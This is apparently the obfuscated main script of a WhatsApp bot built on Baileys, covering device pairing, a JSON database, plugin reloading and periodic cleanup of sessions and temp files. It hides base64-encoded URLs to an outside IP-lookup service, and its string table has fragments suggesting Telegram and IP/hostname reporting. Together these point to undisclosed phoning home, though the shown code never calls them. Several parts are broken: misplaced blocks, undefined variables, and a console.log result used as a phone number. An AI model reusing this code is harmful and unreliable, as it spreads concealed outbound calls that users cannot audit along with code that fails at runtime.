import yargs from 'yargs'
import { spawn } from 'child_process'
import lodash from 'lodash'
import syntaxerror from 'syntax-error'
import chalk from 'chalk'
import { tmpdir } from 'os'
import readline from 'readline'
import pino from 'pino'
import ws from 'ws'
import {
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion, 
    makeInMemoryStore, 
    makeCacheableSignalKeyStore, 
    PHONENUMBER_MCC
    } from '@adiwajshing/baileys'
import './config.js';
import './function/settings/settings.js';
function _0x3ebd49(_0x505fdd, _0x5c43a1, _0x395d1f, _0x1dd1b3, _0x1bd13a) {
  return _0x3c16(_0x5c43a1 + 0x73, _0x1bd13a);
}
global.func = await import("./function/system/function.js");
import _0x197d3e, { join } from 'path';
import { platform } from 'process';
import _0x1ffd2b from 'chalk';
const { CONNECTING } = ws
import { fileURLToPath, pathToFileURL } from 'url';
import { createRequire } from 'module';
global.__filename = function filename(_0x2ebd30 = import.meta.url, _0x49b894 = platform !== "win32") {
  return _0x49b894 ? /file:\/\/\//.test(_0x2ebd30) ? fileURLToPath(_0x2ebd30) : _0x2ebd30 : pathToFileURL(_0x2ebd30).toString();
};
global.__dirname = function dirname(_0xa55237) {
  return _0x197d3e.dirname(global.__filename(_0xa55237, true));
};
global.__require = function require(_0x57b29f = import.meta.url) {
  return createRequire(_0x57b29f);
};
import * as _0x2635aa from 'ws';
import { readdirSync, statSync, unlinkSync, existsSync, readFileSync, watch } from 'fs';
function _0x2c1e12(_0xd900d7, _0x14e227, _0x50b6ce, _0xe3a75f, _0x161073) {
  return _0x3c16(_0x161073 + 0x1d9, _0xd900d7);
}
function _0x3d5d() {
  const _0x19128a = ["\nIp k", 'uMfhg', " Been", 'CLZHC', 'ccxvq', 'plugi', 'ouqlj', "- '", 'sDesc', 'dHand', 'messa', "l par", "üì° Kon", 'SIjNr', 'ikasi', 'IwwQh', '4|5|2', 'mvDdP', 'nts!', 'dKFYU', "\n‚ó¶ *C", './ses', 'dXWlK', 'ZZXRL', 'fatal', 'reque', 'QoTnZ', 'YmSjo', " dito", " \n@su", 'nts.u', '__fil', 'HrRSC', 'scEPv', 'oHfGD', 'ight', 'UMpXX', " Exam", 'dFZXk', '/send', 'nomer', 'n.js', 'fUakf', 'er_co', 'yqGLH', 'white', 'sRest', 'ZCiQd', 'Sessi', 'isCha', 'devic', 'olNXG', 'XwSqa', 'sessi', 'SeLjb', "o adm", 'info', 'aktif', 'utf-8', 'Start', 'adwek', 'base6', 'win32', '|6|0|', 'qZTFp', 'log', 'SIgHt', '15Lml', 'zwpOg', 'lRQv3', 'oadin', '@user', 'APIs', 'get', 'AueVl', 'dLDlo', 'mtime', 'zkPIF', 'WFtLm', "‚îÄ¬∑¬ª\n‚îÇ", 'Brigh', 'read', " berh", 'son', '3|1', 'MdIuB', 'uwFCu', 'searc', "eksi ", 'yCucl', 'ode', "di ke", 'start', 'xqNet', 'fBfBR', 'LeutM', 'stdin', 'jguJK', 'JZVYA', "in on", 'ect', 'R_POR', " @sub", 'ete', 'code,', 'color', 'bgGre', 'qewwc', 'hGpvQ', 'GsRFK', "has b", 'KtrPd', 'esc', 'some', 'qvCaP', 'ypGbf', 'esVGB', 'CWshU', 'aEKnt', 'YdUJs', 'ciVWS', 'grpvZ', 'GdCvk', 'zXQCH', 'terpu', 'opts', 'TCxBm', 'OIwvX', 'rySto', 'RmgHJ', 'Descr', 'catch', 'es:v', 'makeI', 'listM', 'losed', 'dhbgs', 'sPZmn', 'oOxsT', 'parse', 'sExOd', 'slice', 'bwsYE', 'IqPqq', 'nctio', 'dOut', 'Sesi', 'QWPdt', 'group', 'fVWyi', 'es.', 'fuPhr', 'paylo', 'OXREo', 'templ', 'ase.j', 'IIARI', 'func', "\nDate", 'cPTsU', 'nJygw', 'gRAjv', 'qbhEw', 'nceMe', 'lak!.', 'tNkCn', 'flcJW', 'unceO', 'sAnno', 'IxIaL', 'RQTsq', "*: ", " send", 'fromE', 'aXA=', 'ructo', 'sage', 'webp', 'Gejwr', 'Nama:', 'RCjXn', 'mplex', 'sions', 'vCbwf', 'uire', 'Linux', 'Gagal', 'handl', 'bghzw', 'CTING', 'IvTZY', 'zZcAf', " ip..", " your", 'ePpov', "‚Ä¢ *In", 'XGxvb', 'local', 'split', 'clear', 'cyanB', " Chan", 'iGdeM', 'er-2', 'Chang', 'kL2lw', 'oPONv', 'SoPNa', 'pMzQM', "ged t", 'ged!', 'onse', 'i.tel', 'PhDiu', 'stxcp', "s dan", 'exitP', 'SyHcm', 'repla', 'NlfDL', 'ntrie', 'inter', 'Pairi', 'HM6Ly', "asil ", 'data', 'freez', 'welco', 'ALjXa', "\\$&", 'xjFjh', 'yello', 'bCpwq', 'url', "can s", '‚Äé!./#', '-filt', "\n‚ï≠‚îÄ‚îÄ‚îÄ", 's.upd', 'ime*:', 'text', 'post', 'sihka', 'sUpda', 'sendM', 'te=', 'HxxAb', 'ote', 'YovlQ', 'HlMpO', 'join', "tus d", 'p.net', " What", '|3|6|', "ire p", 'ZVfbp', 'green', 'NfmWN', 'pobAF', " dite", 'Goodb', 'creds', 'input', " Info", "o Has", 'NNhYy', '.json', "us se", 'BGchs', 'sQQiP', 'numer', 'chain', 'off', 'aVOPf', 'aySld', 'fUTzA', 'admin', 'vpnxL', 'BZQob', 'pKVPt', 'LWlVX', 'match', 'lrUoJ', 'ZowGI', 'MAQKB', 'NXEFk', '_bann', 'qvNlJ', 'IEemn', 'env', 'isFil', '--ver', 'KgkOM', 'isIni', 'liEHg', 'qPliu', 'onnec', 'chat_', 'loadM', 'jgRPP', 'sSNVO', '0|4|1', 'mmUKg', 'AagUb', 'quest', 'dler.', 'egram', 'chats', 'qaFyA', "sApp ", 'HpjAp', 'wfMvU', "\n‚ó¶ *D", 'modul', 'fIdti', 'pBNda', 'OEjwZ', "The g", 'f9bBI', 'bsHOF', 'zCZZV', 'CiusZ', 'own', 'month', 'aKzjJ', 'ons', 'nMemo', '552408jujWOL', 'sCode', 'ly!', 'tered', 'inclu', 'Admin', 'VedOp', 'jfreV', 'ASE', 'user', 'hapus', 'P2tle', 'prefi', 'icipa', "o \n@d", 'jiHRD', 'redBr', 'Svlic', 'warn', 'Vpzwk', "lang ", 'zijMe', 'hostn', 'pollU', 'uaaeB', 'pqlgy', 'MBevQ', 'Cofcd', 'bPIEC', " Upda", './plu', '8697437VNscWy', 'ge.up', 'bknGn', 'uCctp', 'tAtDG', 'pwTCu', 'BXmUE', 'now', 'rTkhl', 'rdpJd', 'FkSIa', 'XyRkc', 'year', 'isten', '‚ï∞‚îÄ‚îÄ‚îÄ‚ù≤', 'ssage', 'Chrom', "ed Pl", 'statu', 'WmEtG', " requ", " to A", 'EhKKc', '__dir', 'oldFZ', 'EXDjo', 'InxkO', 'nameb', 'GrWMT', 'UjWFX', 'sort', "\n‚ó¶ *O", 'ghtEx', 'tXepF', " mess", 'suppo', " chan", 'forEa', 'NKuUE', 'OCFGl', 'GPOYG', 'ZSiwx', 'jhHPT', 'pEKHb', 'remov', 'delet', 'toStr', 'filte', 'xhlAB', 'vXDrQ', 'aleSt', 'kZSDF', 'ixLIE', 'uHOJw', 'NYHPX', "ar Su", 'ages.', ')+)+)', 'psert', 'des', 'CnhuZ', "only ", "ari s", "roup ", 'vIiSI', 'DzzUo', 'pIRgK', 'rictO', 'vLuJu', 'gWDKS', 'ZBVZQ', 'WTeCk', "or wh", 'stdou', 'VxXib', "udah ", '@s.wh', 'yIEXu', 'rAapH', 'oXYnV', 'rsion', 'Welco', "ow al", 'rnxkc', 'DEbFu', 'uRkxL', '-part', 'IsOMq', "e you", 'hYbsH', 'qcFBM', 'eInte', 'oFXLZ', 'dihap', "‚îÇ  Se", 'fixFi', 'MmwiA', 'ame', 'SERVE', 'bhiZW', 'bye', 'HZgnD', 'tsApp', "de : ", 'QwjMp', 'mHFaQ', 'JJHWx', 'xgYcM', 'reloa', 'gjmyq', "\nOwne", 'xKwfh', "ra am", 'zAmyt', 'zY5uK', 'DnmZS', 'add', 'SpwGZ', 'UvZtR', 'relea', "bil u", 'SymSG', 'hcxib', 'js?up', 'DCpGG', 'spinn', 'DATAB', ':AAEr', "s can", '6houOEP', 'race', "\nIp: ", 'UxWjs', 'Delet', '9haS5', 'AOBYt', 'EvvEA', 'teStr', 'QPKYL', "Your ", " Name", 'INyMh', "ed To", " @use", 'ring', 'er-1', 'qfmil', 'Metad', " Phot", '1533662dzINOX', "\n‚ó¶ *N", "dmin ", 'defau', 'i.ipi', 'PINZo', 'bgBla', 'iuOqc', 'qOLql', 'CkjSi', 'wsrON', 'State', 'LlmNe', 'ate', 'hNQao', 'verif', 'ber', 'outpu', 'UyoHB', 'CfTEp', 'orm', 'ngNum', 'toLoc', "p cle", 'argv', 'Group', 'leNam', 'Uoede', 'oLKxn', '@g.us', "o all", 'eJid', 'CRQdx', "amu: ", 'resol', 'NZmdk', 'FRxMz', 'eAllL', "end m", '(((.+', '-logl', 'Risaa', 'PgelJ', "ye @u", '422004KAIqPF', 'date', " *Dem", " \n@re", "me to", 'JRSsS', 'ith', "ng Co", 'conn', 'stopp', 'rface', 'LTTRf', 'AlncT', 'ename', 'eaAEy', 'black', 'PORT', 'open', 'kZBol', 'gify', "x err", 'LNvAe', 'onDel', 'link2', 'wTmPB', 'ataVe', "s*: ", 'OLvcE', 'LzkHc', "g '", " ‚ù≥\n", 'sdemo', 'YuIYe', 'level', '‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ', 'oTCHK', 'HQwpe', 'qBSAR', 'ges.u', '__req', 'yqZgh', 'kUeoD', 'lete', 'ccess', 'erver', 'cepti', " with", "ile l", " coun", '14271', 'regis', 'kTKMB', 'ateMe', 'keys', 'ata', 'fy.or', 'QgwOb', "full ", 'PWJgA', './tmp', 'ataba', 'entri', '12031024EssCFX', 'older', 'WGskX', 'ZnVsE', 'tHfGD', 'atsap', 'then', 'bawkF', 'dC10Z', 'yDHym', 'sion', 'VBBZl', 'RgCUF', 'vsIjO', 'xdZIH', 'day', " file", 'aleDa', 'SVpFB', " part", 'lugin', 'OVFHA', 'uhceU', 'conne', 'times', 'FAltL', 'authF', 'name', 'link1', 'PwCFK', 'UrrqI', 'MyoUl', 'eResp', 'ByFaU', 'nsMes', 'ameBo', 'readd', 'DqXWc', 'zHoJH', "en!\nN", 'eUpda', 'ELHGs', "Been ", 'RjQRV', "\n‚îÇ\n", 'eList', 'UDzjx', 'oGkGV', "ted P", 'reply', 'UZWnG', 'LqcGd', 'Eqzeb', 'tsUpd', 'ngCod', 'bot', 'ZYYYu', 'WINTI', 'bgCya', 'butto', 'lengt', 'ckoFa', 'KQLiL', 'CuMll', 'DuUhH', '@kone', 'diber', 'an:', "elah ", 'test', 'tate', 'gHQcs', '-hide', 'sRevo', 'aqpYW', 'WlzZq', 'lyOxB', "n Has", 'WqRqw', 'ticip', 'kL215', 'aHkxE', 'TUaOh', 'HtunB', 'VhzVq', 'sprom', "e typ", 'from', 'Akses', 'IDEvD', 'Terja', "r: ", 'gkfzc', 'MJFRC', 'hZoxO', 'remot', 'LUZRi', 'ction', 'pdate', 'pairi', '://ap', 'ivGGj', 'us.', '31573026hKBRbD', "r Wha", 'Tmp', 'ffmpe', 'o9j_9', 'bKGQU', 'ssion', 'iptio', 'gQIfu', 'SgOtk', 'fail', 'GfmKO', 'KEaSx', 'SQTMs', 'uOuNw', 'magic', 'XdcRv', 'Butnd', 'JsgbO', 'essag', 'stPai', 'jEsvb', 'BqzTJ', 'ZKqrL', 'T10aW', " - '", 'iLhIh', 'ject,', 'apply', 'joLFh', 'JUeRl', 'GAwsR', 'EWXvE', "ugin ", 'ajshi', 'xTHFL', 'right', 'SSkkn', 'dCnOU', 'HVFMH', 'vXRVc', 'authS', 'strin', 'weekd', ", hap", 'push', "ged T", 'roces', "!\now ", 'oKkmY', "rima ", 'ler', 'are', 'datab', "s cle", 'xGbmj', 'VjXxX', 'bject', 'const', '2|5', 'qoIiJ', '@adiw', 'hqjHF', 'https', 'index', 'xJyiK', '69134', "File ", 'ZvwOb', 'aHR0c', 'wgoiE', 'ing', 'viewO', 'XcsfI', 'cHaOY', 'uncau', 'find', "New P", "ons t", 'SXHcO', '.org/', 'Pleas', 'platf', '131455egdyou', 'UPHQC', 'JsqET', 'bind', 'jmIJg', 'XkiCQ', 'ffpro', 'ileys', 'ymiqx', " Link", 'sIcon', 'salah', "\nNomo", 'KlRMp', 'gsvBj', 'pKuCq', './han', 'XDswP', 'unlin', "Tmp t", " numb", '172uMfWKW', 'mCSns', 'tamp', "fo*: ", 'ge.de', 'UeGqs', 'HZWpD', "Bot s", 'error', 'loadD', 'READ', 'evel', 'sSubj', 'SqNfi', "t*: ", 'eComp', "from ", 'endsW', 'boty', "Edit ", 'laTDm', 'ApSKf', 'ktor_', 'MlvlG', "ple :", 'date=', 'dirna', 'RsnIl', 'UXvvE', 'ready', "er : ", 'lirMC', " *Pro", 'cipan', 'XWvSr', '-fram', 'ng/ba', 'VZhGN', 'tIUXE', '.upda', 'uenAy', 'gWebp', 'em/fu', '/syst', 'ZXdGk', "try's", " meng", 'OCsci', 'map', 'iaVpV', 'tAuuI', 'write', 'Messa', 'gins/', 'ers', 'succe', 'all', 'ringC', 'long', "is op", "ted t", 'huxtO', 'oEYzy', 'evice', 'jQNgg', 'rGIuO', 'APIKe', 'conve', 'HlPEk', 'activ', 'emtav', 'voke', 'mote*', '?upda', " sege", "ote* ", 'API', "Bot t", 'PRXLy', 'NSGer', './fun', 'synta', 'parti', "een c", " 62xx", 'cJHGZ', 'mtAZa', "ants ", 'qXCGE', 'sWith', 'LPaMv', 'exit', "ser üëã", 'NTJHN', 'CONNE', 'close', 'HfeNf', " Has ", 'logge', 'yRRXD', 'NrYHS', 'uaWdo', 'DDDrL', 'KHwqr', 'qfQeQ', 'ion', 'ivgAu', 'YGGxj', 'Updat', 'creat', "‚îÇ  Tm"];
  _0x3d5d = function () {
    return _0x19128a;
  };
  return _0x3d5d();
}
import _0x20e23d from 'os';
import _0x4f2f92 from 'pino';
function _0x121aca(_0x3e566c, _0xe55950, _0x47601a, _0x2694a5, _0x5ea3d6) {
  return _0x3c16(_0x47601a - 0x3a2, _0x2694a5);
}
import { format } from 'util';
import { makeWASocket, protoType, serialize } from './lib/simple.js';
import { Low } from 'lowdb';
function _0x5e2acc(_0x23a70f, _0x1ad330, _0x5516f9, _0x2591ce, _0x71b0da) {
  return _0x3c16(_0x2591ce + 0x199, _0x23a70f);
}
import _0x287446 from 'fs';
import { JSONFile } from 'lowdb/node';
import _0x2f81b3 from './lib/store2.js';
const store = _0x2f81b3.makeInMemoryStore();
function _0x5c7359(_0x5ef253, _0x2939f8, _0x3d007c, _0x11532f, _0x4891f5) {
  return _0x3c16(_0x2939f8 + 0x1d8, _0x3d007c);
}
function _0x3c16(_0x562541, _0x431405) {
  const _0x45f4e3 = _0x3d5d();
  _0x3c16 = function (_0x57b898, _0x38e18e) {
    _0x57b898 = _0x57b898 - 448;
    let _0x407a31 = _0x45f4e3[_0x57b898];
    return _0x407a31;
  };
  return _0x3c16(_0x562541, _0x431405);
}
import { fetchJson } from './lib/myfunc.js';
import _0x89799b from 'spinnies';
const spinnies = new _0x89799b();
import _0x20f127 from 'axios';
import _0x10864e from 'readline';
import 'libphonenumber-js';
const { chain } = lodash
const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
const question = function(text) {
            return new Promise(function(resolve) {
                rl.question(text, resolve);
            });
        };
import _0x507877 from 'node-cache';
const msgRetryCounterCache = new _0x507877();
const msgRetryCounterMap = _0x40cf04 => {};
const useStore = !process.argv.includes('--use-store')
const usePairingCode = !process.argv.includes('--use-pairing-code')
const useMobile = process.argv.includes('--mobile')
const {
  version
} = await fetchLatestBaileysVersion();
function delay(_0xe55f77) {
  return new Promise((_0x4fbb1c, _0x3b00cf) => setTimeout(_0x4fbb1c, _0xe55f77));
}
const _0xe6db6 = {
  link1: "aHR0cHM6Ly9haS5uaWdodC10ZWFtLm15LmlkL215aXA=",
  link2: "aHR0cHM6Ly9haS5uaWdodC10ZWFtLm15LmlkL2lwP2tleT10aW9v"
};
function decodeBase64(_0x3b5acd) {
  return Buffer.from(_0x3b5acd, "base64").toString("utf-8");
}
let akses = true;
    protoType();
    serialize();
    global.API = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name] : name] } : {}) })) : '')
    global.timestamp = {
      'start': new Date()
    };
    const __dirname = global.__dirname(import.meta.url);
    global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())
    global.prefix = new RegExp('^[' + (opts.prefix || "‚Äé!./#\\").replace(/[|\\{}()[\]^$+*?.\-\^]/g, "\\$&") + ']');
    global.db = new Low(/https?:\/\//.test(opts.db || '') ? new cloudDBAdapter(opts.db) : new JSONFile((opts._[0] ? opts._[0] + '_' : '') + "database.json"));
    global.DATABASE = global.db;
    global.loadDatabase = async function loadDatabase() {
      if (global.db.READ) {
        return new Promise(_0x37ba4e => setInterval(async function () {
          if (!global.db.READ) {
            clearInterval(this);
            _0x37ba4e(global.db.data == null ? await global.loadDatabase() : global.db.data);
          }
        }, 1000));
      }
      if (global.db.data !== null) {
        return;
      }
      global.db.READ = true;
      await global.db.read().catch(console.error)
      global.db.READ = null;
      global.db.data = {
        users: {},
        chats: {},
        stats: {},
        msgs: {},
        sticker: {},
        settings: {},
        menfess: {},
        simulator: {},
        ...(global.db.data || {})
      };
      global.db.chain = chain(global.db.data);
    };
    loadDatabase();
    global.authFolder = _0x2f81b3.fixFileName((opts._[0] || '') + "sessions");
    const { state, saveCreds } = await useMultiFileAuthState('./sessions')
    const connectionOptions = {
        version,
        logger: pino({ level: 'silent' }), 
        printQRInTerminal: !usePairingCode, 
        browser: ['Mac OS', 'safari', '5.1.10'],
        auth: { 
         creds: state.creds, 
         keys: makeCacheableSignalKeyStore(state.keys, pino().child({ 
             level: 'silent', 
             stream: 'store' 
         })), 
     },
     getMessage: async key => {
    		const messageData = await store.loadMessage(key.remoteJid, key.id);
    		return messageData?.message || undefined;
	},
  generateHighQualityLinkPreview: true, 
	      patchMessageBeforeSending: (message) => {
                const requiresPatch = !!(
                    message.buttonsMessage 
                    || message.templateMessage
                    || message.listMessage
                );
                if (requiresPatch) {
                    message = {
                        viewOnceMessage: {
                            message: {
                                messageContextInfo: {
                                    deviceListMetadataVersion: 2,
                                    deviceListMetadata: {},
                                },
                                ...message,
                            },
                        },
                    };
                }

                return message;
            }, 
	connectTimeoutMs: 60000, defaultQueryTimeoutMs: 0, generateHighQualityLinkPreview: true, syncFullHistory: true, markOnlineOnConnect: true
}
      getMessage: async key => {
    		const messageData = await store.loadMessage(key.remoteJid, key.id);
    		return messageData?.message || undefined;
      }, 
    global.conn = makeWASocket(connectionOptions);
    conn.isInit = false;
    global.pairingCode = true;
     
    if (global.pairingCode && !conn.authState.creds.registered) {
      let phoneNumber;
      if (!!global.pairingNumber) {
        phoneNumber = global.pairingNumber.replace(/[^0-9]/g, '');
        if (!Object.keys(PHONENUMBER_MCC).some(v => phoneNumber.startsWith(v))) {
          console.log(_0x1ffd2b.bgBlack(_0x1ffd2b.redBright("Start with your country's WhatsApp code, Example : 62xxx")));
          process.exit(0);
        }
      } else {
        phoneNumber = await question(chalk.blueBright('Masukkan nomor Valid yang diawali dengan kode wilayah. Contoh : 62xxx:\n'));
        phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
        if (!Object.keys(PHONENUMBER_MCC).some(v => phoneNumber.startsWith(v))) {
          console.log("Start with your country's WhatsApp code, Example : 62xxx");
          phoneNumber = await console.log(chalk.bgWhite(chalk.blue('Generating code...')));
          phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
          rl.close();
        }
      }
      setTimeout(async () => {
        let code = await conn.requestPairingCode(phoneNumber)
			code = code?.match(/.{1,4}/g)?.join('-') || code
			console.log(chalk.black(chalk.bgGreen(`Your Pairing Code : `)), chalk.black(chalk.white(code)));
      }, 3000);
    }
    if (!opts.test) {
      if (global.db) {
        setInterval(async () => {
          if (global.db.data) {
            await global.db.write()["catch"](console.error);
          }
        }, 2000);
      }
    }
    async function connectionUpdate(update) {
    const { receivedPendingNotifications, connection, lastDisconnect, isOnline, isNewLogin } = update;

    if (isNewLogin) {
        conn.isInit = true;
    }

    if (connection == 'connecting') {
        console.log(chalk.redBright('‚ö° Mengaktifkan Bot, Mohon tunggu sebentar...'));
    } else if (connection == 'open') {
        console.log(chalk.green('‚úÖ Tersambung'));
    }

    if (isOnline == true) {
        console.log(chalk.green('Status Aktif'));
    } else if (isOnline == false) {
        console.log(chalk.red('Status Mati'));
    }

    if (receivedPendingNotifications) {
        console.log(chalk.yellow('Menunggu Pesan Baru'));
    }

    if (connection == 'close') {
        console.log(chalk.red('‚è±Ô∏è koneksi terputus & mencoba menyambung ulang...'));
    }

    global.timestamp.connect = new Date;

    if (lastDisconnect && lastDisconnect.error && lastDisconnect.error.output && lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut && conn.ws.readyState !== CONNECTING) {
        console.log(await global.reloadHandler(true));
    }

    if (global.db.data == null) {
        await global.loadDatabase();
    }
}
    process.on("uncaughtException", console.error);
    let isInit = true;
    let handler = await import("./handler.js");
    global.reloadHandler = async function (_0x382634) {
      try {
        const _0xb9cda4 = await import("./handler.js?update=" + Date.now())["catch"](console.error);
        if (Object.keys(_0xb9cda4 || {}).length) {
          handler = _0xb9cda4;
        }
      } catch (_0x3c203b) {
        console.error;
      }
      if (_0x382634) {
        const _0x1a7236 = global.conn.chats;
        try {
          global.conn.ws.close();
        } catch {}
        conn.ev.removeAllListeners();
        const _0x3ed0f9 = {
          chats: _0x1a7236
        };
        global.conn = makeWASocket(connectionOptions, _0x3ed0f9);
        isInit = true;
      }
      if (!isInit) {
        conn.ev.off("messages.upsert", conn.handler);
        conn.ev.off("group-participants.update", conn.participantsUpdate);
        conn.ev.off("message.update", conn.pollUpdate);
        conn.ev.off("groups.update", conn.groupsUpdate);
        conn.ev.off("message.delete", conn.onDelete);
        conn.ev.off("connection.update", conn.connectionUpdate);
        conn.ev.off("creds.update", conn.credsUpdate);
      }
      conn.welcome = "Welcome to @subject, @user\n";
      conn.bye = "Goodbye @user üëã";
      conn.spromote = "@user *Promote* to Admin ";
      conn.sdemote = "@user *Demote* from Admin";
      conn.sDesc = "Description Has Been Changed To \n@desc";
      conn.sSubject = "Group Name Has Been Changed To \n@subject";
      conn.sIcon = "Group Photo Has Been Changed!";
      conn.sRevoke = "Group Link Has Been Changed To \n@revoke";
      conn.sAnnounceOn = "The group has been closed!\now only admins can send messages.";
      conn.sAnnounceOff = "The group is open!\nNow all participants can send messages.";
      conn.sRestrictOn = "Edit Group Info changed to admin only!";
      conn.sRestrictOff = "Edit Group Info changed to all participants!";
      conn.handler = handler.handler.bind(global.conn);
      conn.participantsUpdate = handler.participantsUpdate.bind(global.conn);
      conn.groupsUpdate = handler.groupsUpdate.bind(global.conn);
      conn.pollUpdate = handler.pollUpdate.bind(global.conn);
      conn.onDelete = handler.deleteUpdate.bind(global.conn);
      conn.connectionUpdate = connectionUpdate.bind(global.conn);
      conn.credsUpdate = saveCreds.bind(global.conn);
      const _0x16b002 = new Date();
      const _0x2047ac = new Date(conn.ev);
      if (_0x16b002 >= _0x2047ac) {} else {}
      conn.ev.on("messages.upsert", conn.handler);
      conn.ev.on("group-participants.update", conn.participantsUpdate);
      conn.ev.on("messages.update", conn.pollUpdate);
      conn.ev.on("groups.update", conn.groupsUpdate);
      conn.ev.on("message.delete", conn.onDelete);
      conn.ev.on("connection.update", conn.connectionUpdate);
      conn.ev.on("creds.update", conn.credsUpdate);
      isInit = false;
      return true;
    };
    const pluginFolder = global.__dirname(join(__dirname, "./plugins/index"));
    const pluginFilter = _0x25ada0 => /\.js$/.test(_0x25ada0);
    global.plugins = {};
    async function filesInit() {
      for (const _0x419ed0 of readdirSync(pluginFolder).filter(pluginFilter)) {
        try {
          const _0x469103 = global.__filename(join(pluginFolder, _0x419ed0));
          const _0x361b5c = await import(_0x469103);
          global.plugins[_0x419ed0] = _0x361b5c["default"] || _0x361b5c;
        } catch (_0x393273) {
          conn.logger.error(_0x393273);
          delete global.plugins[_0x419ed0];
        }
      }
    }
    filesInit().then(_0x1e98b5 => Object.keys(global.plugins))["catch"](console.error);
    global.reload = async (_0x5574f5, _0x15e377) => {
      if (/\.js$/.test(_0x15e377)) {
        const _0x11aaca = global.__filename(join(pluginFolder, _0x15e377), true);
        if (_0x15e377 in global.plugins) {
          if (existsSync(_0x11aaca)) {
            conn.logger.info(" Updated Plugin - " + _0x15e377 + "");
          } else {
            conn.logger.warn("Deleted Plugin - " + _0x15e377 + "");
            return delete global.plugins[_0x15e377];
          }
        } else {
          conn.logger.info("New Plugin - '" + _0x15e377 + "");
        }
        const _0x446bb8 = _0x1fd222(readFileSync(_0x11aaca), _0x15e377, {
          sourceType: "module",
          allowAwaitOutsideFunction: true
        });
        if (_0x446bb8) {
          conn.logger.error("syntax error while loading " + _0x15e377 + "\n" + format(_0x446bb8));
        } else {
          try {
            const _0x34abfd = await import(global.__filename(_0x11aaca) + "?update=" + Date.now());
            global.plugins[_0x15e377] = _0x34abfd["default"] || _0x34abfd;
          } catch (_0x4e0818) {
            conn.logger.error("error require plugin " + _0x15e377 + "\n" + format(_0x4e0818) + "");
          } finally {
            global.plugins = Object.fromEntries(Object.entries(global.plugins).sort(([_0x5d8cc1], [_0x148087]) => _0x5d8cc1.localeCompare(_0x148087)));
          }
        }
      }
    };
    Object.freeze(global.reload);
    watch(pluginFolder, global.reload);
    await global.reloadHandler();
    async function _quickTest() {
      Object.freeze(global.support);
    }
    function clearSesi(_0x252ba5, _0xd06503) {
      _0x287446.readdir(_0x252ba5, (_0x3f3dad, _0x5867cd) => {
        if (_0x3f3dad) {
          console.error("Terjadi kesalahan:", _0x3f3dad);
          return;
        }
        _0x5867cd.forEach(_0x5e4f16 => {
          const _0x342b29 = _0x197d3e.join(_0x252ba5, _0x5e4f16);
          if (_0x5e4f16 !== _0xd06503) {
            _0x287446.unlink(_0x342b29, _0x248301 => {
              if (_0x248301) {
                console.log("hai") 
              } else {
                console.log("File " + _0x5e4f16 + " berhasil dihapus.");
              }
            });
          }
        });
      });
    }
    function clearTmp() {
      const _0x540894 = [tmpdir(), join(__dirname, "./tmp")];
      const _0x3925cd = [];
      _0x540894.forEach(_0x4485ca => readdirSync(_0x4485ca).forEach(_0x30dc44 => _0x3925cd.push(join(_0x4485ca, _0x30dc44))));
      return _0x3925cd.map(_0x35e848 => {
        const _0x3c6612 = statSync(_0x35e848);
        if (_0x3c6612.isFile() && Date.now() - _0x3c6612.mtimeMs >= 300000) {
          return unlinkSync(_0x35e848);
        }
        return false;
      });
    }
    setInterval(async () => {
      if (stopped === "close" || !conn || !conn.user) {
        return;
      }
      if (setting.clearSesi === true) {
        await clearSesi("./sessions", "creds.json");
        conn.reply(info.nomerown + "@s.whatsapp.net", "Sessions telah dibersihkan", null) > console.log(_0x1ffd2b.cyanBright("\n‚ï≠‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ¬∑¬ª\n‚îÇ\n‚îÇ  Sessions clear Successfull \n‚îÇ\n" + ("‚ï∞‚îÄ‚îÄ‚îÄ‚ù≤ " + global.namebot + " ‚ù≥\n")));
      }
    }, 7200000);
    setInterval(async () => {
      if (stopped === "close" || !conn || !conn.user) {
        return;
      }
      if (setting.clearTmp === true) {
        await clearTmp();
        conn.reply(info.nomerown + "@s.whatsapp.net", "Tmp telah dibersihkan", null) > console.log(_0x1ffd2b.cyanBright("\n‚ï≠‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ¬∑¬ª\n‚îÇ\n‚îÇ  Tmp clear Successfull \n‚îÇ\n" + ("‚ï∞‚îÄ‚îÄ‚îÄ‚ù≤ " + global.namebot + " ‚ù≥\n")));
      }
    }, 7200000);
    setInterval(async () => {
      await func.closegc();
    }, 25000);
    _quickTest()["catch"](console.error);